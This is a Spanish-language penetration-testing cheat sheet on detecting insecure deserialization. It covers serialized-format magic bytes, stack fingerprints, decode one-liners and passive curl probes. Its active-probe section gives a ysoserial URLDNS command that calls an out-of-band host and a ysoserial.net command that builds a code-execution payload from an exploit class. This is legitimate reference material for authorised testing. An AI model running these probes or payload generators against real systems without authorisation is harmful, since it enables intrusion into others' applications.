---
aliases:
  - Deserialization Detection
  - Deserialization Recon
  - Serialization Fingerprint
tags:
  - type/technique
  - vuln/insecure-deser
  - technique/discovery
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[Insecure Deserialization]]'
---
# Insecure Deserialization - Detección y Reconocimiento

***

## Identificación de Formatos Serializados

| **Lenguaje** | **Magic bytes / prefix** | **Encoding típico** | **Pista visual** |
|:---:|:---:|:---:|:---:|
| **PHP** | `O:8:"stdClass":` / `a:N:{...}` / `s:N:"..."` | base64 / urlencoded | `Tzo4OiJzdGRDbGFzcyI6...` (b64) o `O%3A8%3A%22stdClass%22%3A...` |
| **Java (binary)** | `0xACED 0x0005` (`rO0`-prefix b64) | base64 | `rO0ABXNyAA...` — clásico `ObjectInputStream`. |
| **Java (gzip)** | `0x1F 0x8B` (gzip magic) + `rO0` adentro | base64 | `H4sIAA...` decoded → `rO0...`. |
| **Python pickle** | `0x80 0x04 ...` (proto 4) / `(dp0\nS'...'` (legacy) | base64 | `gASV...` (b64). `pickle.loads` |
| **.NET BinaryFormatter** | `0x00 0x01 0x00 0x00 0x00 FF FF FF FF` | base64 | `AAEAAAD/////AQAAAAAAAAAMAgAAAA...`. |
| **.NET ObjectStateFormatter (ViewState)** | `/wEP...` (b64) | URL-encode | `__VIEWSTATE` field, prefix `/wE`. |
| **Ruby Marshal** | `0x04 0x08` | base64 / hex | `BAh...` (b64). `Marshal.load`. |
| **Ruby YAML** | `--- !ruby/object:` / `!ruby/hash` | plaintext | YAML con tags Ruby. |
| **Node node-serialize** | `_$$ND_FUNC$$_function(){...}` | plaintext / b64 | Strings con `_$$ND_FUNC$$_`. |
| **JSON polymorphic** | `{"$type":"...","..."}`  / `{"@class":"..."}` | JSON | `$type` (.NET), `@class` (Jackson), `__type__`. |
| **MessagePack** | Bytes binarios, no ASCII | hex / b64 | Headers `0x80-0xff`. |
| **BSON** | LE-int prefix + null-terminated strings | b64 | Mongo-like. |
| **PHP serialize en cookie** | Cookie con `O:N:` o `a:N:` decodeado | url-encoded | URL-decode + b64-decode escalonados. |
^deser-detect-formats

### Decode rápido por lenguaje

```bash
# PHP — buscar pattern serializado
echo "$cookie" | php -r 'print_r(unserialize(file_get_contents("php://stdin")));'

# Java — verificar header
echo "$value" | base64 -d | xxd | head -1
# Buscar: 0000: aced 0005 → Java serialized

# Python pickle — análisis sin ejecutar
python3 -c "import pickletools, base64; pickletools.dis(base64.b64decode('$value'))"

# .NET BinaryFormatter
echo "$value" | base64 -d | xxd | head -1
# Buscar: 0000: 0001 0000 00ff ffff ff

# Ruby Marshal
ruby -rbase64 -e 'p Marshal.load(Base64.decode64(STDIN.read))' <<< "$value"

# JSON polymorphic — inspect keys
echo "$json" | jq 'keys' | grep -iE '\\$type|@class|__type__'
```

___

## Fingerprint del Stack

| **Indicador** | **Stack probable** | **Vector** |
|:---:|:---:|:---:|
| Cookie con base64 empezando en `O:` / `a:` | PHP `unserialize()` | PHP Object Injection. |
| `__VIEWSTATE` en form | ASP.NET WebForms | ViewState deser (BinaryFormatter / LosFormatter). |
| Cookie / param empezando en `rO0` | Java `ObjectInputStream` | ysoserial gadgets. |
| `Content-Type: application/x-java-serialized-object` | Java serialization explícita | readObject directo. |
| `JSESSIONID` con base64 que decodea a binario | Java session container | Tomcat/JBoss/WebLogic deser. |
| Header `X-Powered-By: ASP.NET` + base64 raro | .NET BinaryFormatter / NetDataContract | ysoserial.net. |
| Header `Server: WEBrick` / `Phusion Passenger` | Ruby Rails | Marshal / YAML.load. |
| JSON con `"$type":"..."` en body | Newtonsoft.Json (TypeNameHandling) | JSON.NET deser. |
| JSON con `"@class":"..."` | Jackson polymorphic | Jackson deser. |
| YAML con `!!ruby/object:` o `!!python/object:` | YAML.load unsafe | YAML deser RCE. |
| Cookie `connect.sid=s:...` | Express + node-serialize | Node deser. |
| `package.json` con `node-serialize` dep | Node.js explícito | `serialize.unserialize`. |
| Header `X-Apache-Sling-Property` | Apache Sling | Sling Serialization gadgets. |
| Frameworks Java: Struts2 / Spring / WebLogic / Jenkins | CVE-2017-5638, CVE-2019-2725, etc | Pre-auth RCE conocidos. |
| `web.config` con `enableViewStateMac="false"` | ASP.NET inseguro | ViewState exploitable sin MAC key. |
| PHP framework: Magento / WordPress / Joomla | PHPGGC chains | Object injection con gadgets pre-hechos. |
^deser-detect-fingerprint

### Probes pasivos

```bash
# 1. Buscar serialización en cookies/storage
curl -sI https://target/ | grep -iE 'set-cookie|x-powered-by|server'

# 2. Burp historial — regex
# Buscar: rO0|O:[0-9]+:|a:[0-9]+:\{|gASV|AAEAAAD|/wE|BAh|aced0005

# 3. .NET: ViewState handler
curl -s https://target/page.aspx | grep -oE '__VIEWSTATE.*value="[^"]*"' | head

# 4. Java: detectar headers que sugieren deser
curl -sI https://target/ | grep -i 'java-serialized\|JSESSIONID'
```

### Probes activos (cuidado)

```bash
# 1. Tools que detectan deser por timing
# - GadgetProbe (Java)
# - PHPGGC con --test
# - ysoserial con SimpleHTTPServer + URLDNS gadget (canary OOB)

# 2. Java URLDNS canary (gadget no-RCE)
java -jar ysoserial.jar URLDNS "http://abc123.oast.fun/canary" | base64 -w0

# Si la app deserializa el blob → DNS query a abc123.oast.fun.
# Sin RCE — solo confirma que readObject() ejecuta.

# 3. .NET ActivitySurrogateSelector probe
ysoserial.net.exe -g ActivitySurrogateSelectorFromFile -f BinaryFormatter \
  -c "ExploitClass.cs;System.Windows.Forms.dll" -o base64
```

***
